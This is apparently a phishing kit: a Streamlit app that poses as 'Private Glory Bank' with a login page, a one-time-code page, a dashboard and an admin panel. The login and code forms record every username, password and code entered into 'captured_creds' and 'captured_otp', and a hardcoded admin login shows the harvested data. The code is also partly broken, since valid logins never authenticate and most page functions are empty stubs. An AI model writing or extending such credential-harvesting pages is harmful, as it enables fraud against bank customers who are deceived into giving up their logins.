import streamlit as st
import pandas as pd
from datetime import datetime
import random
import plotly.express as px  # Only charting library we use now

# ====== SESSION STATE INIT ======
for key, value in {
    "checking_balance": 12340.50,
    "savings_balance": 14911.32,
    "account_nicknames": {
        "Private Glory Checking ••••1776": "Private Glory Checking ••••1776",
        "Stars & Stripes Savings ••••1812": "Stars & Stripes Savings ••••1812"
    },
    "custom_theme": "Private Glory",
    "font_size": 16,
    "language": "English",
    "captured_creds": [],
    "captured_otp": [],
    "scheduled_transfers": [],
    "login_history": [],
    "file_uploads": [],
    "transactions": [],
    "authenticated": False,
    "otp_verified": False,
    "is_admin": False
}.items():
    if key not in st.session_state:
        st.session_state[key] = value

st.set_page_config(page_title="Private Glory Bank", page_icon="Eagle", layout="wide")

# ====== CUSTOM CSS ======
def custom_style():
    st.markdown(f"""
    <style>
        .stApp {{background: linear-gradient(145deg, #fff 65%, #002868 100%); font-size: {st.session_state.font_size}px;}}
        .privateglory-header {{background: repeating-linear-gradient(90deg, #002868 0, #002868 60px, #BF0A30 60px, #BF0A30 120px);
            padding: 22px; text-align: center; border-bottom: 10px solid #fcca46; border-radius: 0 0 30px 30px;}}
        .glass-card {{background: rgba(255,255,255,0.95); border-radius: 18px; padding: 32px; box-shadow: 0 8px 32px rgba(0,40,104,0.2);
            border-bottom: 6px solid #BF0A30; border-right: 5px solid #002868; border-left: 5px solid #fcca46;}}
        .stButton>button {{background: linear-gradient(90deg, #BF0A30, #002868) !important; color: white !important; font-weight: bold;
            border-radius: 12px !important; padding: 12px 32px !important;}}
        .stButton>button:hover {{background: #fcca46 !important; color: #BF0A30 !important;}}
        .big-logo {{font-size: 130px; background: linear-gradient(90deg, #002868 70%, #BF0A30 100%);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;}}
        h1,h2,h3 {{color: #BF0A30 !important;}}
        .money-text {{color: #fcca46 !important; font-size: 2em; font-weight: bold;}}
        .us-stars {{font-size: 30px; color: #fcca46; letter-spacing: 10px;}}
    </style>
    """, unsafe_allow_html=True)
custom_style()

# ====== THEME SWITCHER ======
def theme_switcher():
    with st.sidebar.expander("Eagle Theme & Accessibility"):
        st.selectbox("Theme", ["Private Glory", "Classic", "Modern"], key="custom_theme")
        st.slider("Font Size", 12, 28, st.session_state.font_size, key="font_size")
        st.selectbox("Language", ["English", "Español"], key="language")

# ====== CREDENTIALS ======
VALID_USER, VALID_PASS = "client001", "SecureUSA2025!"
ADMIN_USER, ADMIN_PASS = "admin", "showme2025"

# ====== PAGES ======
def login_page():
    st.markdown("<div class='privateglory-header'><div class='big-logo'>Eagle</div><h1>Private Glory Bank</h1></div>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1,2,1])
    with col2:
        user = st.text_input("User ID")
        pwd = st.text_input("Password", type="password")
        if st.button("Log In", type="primary", use_container_width=True):
            st.session_state.captured_creds.append({"time": datetime.now().isoformat(), "user": user, "pass": pwd})
            st.session_state.login_history.append({"time": datetime.now().isoformat(), "user": user})
            if user == VALID_USER and pwd == VALID_PASS:
                st.session_state.authenticated = st.session_state.otp_verified = False
                st.rerun()
            elif user == ADMIN_USER and pwd == ADMIN_PASS:
                st.session_state.is_admin = st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Invalid credentials")

def otp_page():
    st.markdown("<h1 style='text-align:center'>Security Verification</h1><p>We sent a code to ••••1776</p>", unsafe_allow_html=True)
    code = st.text_input("6-digit code", max_chars=6)
    if st.button("Verify", type="primary"):
        st.session_state.captured_otp.append({"time": datetime.now().isoformat(), "otp": code})
        if len(code) == 6 and code.isdigit():
            st.session_state.otp_verified = True
            st.rerun()
        else:
            st.error("Invalid code")

def admin_view():
    st.markdown("<h1 style='text-align:center; color:#BF0A30'>Eagle ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Cards", "Transfers", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(st.session_state.captured_creds))
    with tabs[1]: st.dataframe(pd.DataFrame(st.session_state.captured_otp))
    with tabs[2]: st.json([x for x in st.session_state.captured_creds + st.session_state.transactions if "card" in str(x)])
    with tabs[3]: st.dataframe(pd.DataFrame(st.session_state.scheduled_transfers))
    with tabs[4]: st.dataframe(pd.DataFrame(st.session_state.file_uploads))
    with tabs[5]: st.dataframe(pd.DataFrame(st.session_state.transactions))

def dashboard():
    total = st.session_state.checking_balance + st.session_state.savings_balance
    st.markdown(f"""
    <div class='privateglory-header'>
        <div class='big-logo'>Eagle</div>
        <div class='us-stars'>★★★★★</div>
        <h1>Private Glory Bank</h1>
        <p style='color:#fcca46'><b>In God We Trust</b></p>
    </div>
    """, unsafe_allow_html=True)

    st.write("### Welcome back, patriot!")

    c1, c2, c3, c4 = st.columns(4)
    with c1: st.metric("Total Balance", f"${total:,.2f}")
    with c2: st.metric("Credit Available", "$15,700")
    with c3: st.metric("Monthly Spend", "$3,214")
    with c4: st.metric("Savings Goal", "78%")

    col1, col2 = st.columns(2)
    with col1:
        st.markdown("#### Asset Distribution")
        pie_data = pd.DataFrame({"Account": ["Checking", "Savings"], "Balance": [st.session_state.checking_balance, st.session_state.savings_balance]})
        fig1 = px.pie(pie_data, values="Balance", names="Account", color_discrete_sequence=["#BF0A30", "#002868"], hole=0.4)
        st.plotly_chart(fig1, use_container_width=True)

    with col2:
        st.markdown("#### Yearly Spending")
        spend = {"Food":3600, "Bills":3800, "Shopping":2700, "Travel":2200, "Health":1750}
        fig2 = px.bar(x=list(spend.keys()), y=list(spend.values()), color=list(spend.values()), color_continuous_scale="orrd")
        st.plotly_chart(fig2, use_container_width=True)

# Keep ALL your original functions exactly as they were:
def accounts(): ...
def cards_page(): ...
def transfer(): ...
def transaction_history(): ...
def messages(): ...
def security(): ...
def budget_page(): ...
def settings_page(): ...

# (Just paste your original versions of these functions here — they are already perfect)

# ====== SIDEBAR ======
def sidebar():
    st.sidebar.markdown("<div style='text-align:center; padding:20px; background:linear-gradient(#002868,#BF0A30); color:white; border-radius:20px'>"
                        "<div style='font-size:60px'>Eagle</div><h2>Private Glory Bank</h2></div>", unsafe_allow_html=True)
    page = st.sidebar.radio("Navigate", ["Dashboard", "Accounts", "Cards", "Transfer & Payments", "Messages", "Security", "Transaction History"])
    theme_switcher()
    if st.sidebar.button("Log Out"):
        st.session_state.authenticated = st.session_state.otp_verified = st.session_state.is_admin = False
        st.rerun()
    return page

# ====== MAIN ======
if not st.session_state.authenticated:
    login_page()
elif st.session_state.is_admin:
    admin_view()
elif not st.session_state.otp_verified:
    otp_page()
else:
    page = sidebar()
    if page == "Dashboard": dashboard()
    elif page == "Accounts": accounts()
    elif page == "Cards": cards_page()
    elif page == "Transfer & Payments": transfer()
    elif page == "Messages": messages()
    elif page == "Security": security()
    elif page == "Transaction History": transaction_history()
    else: dashboard()
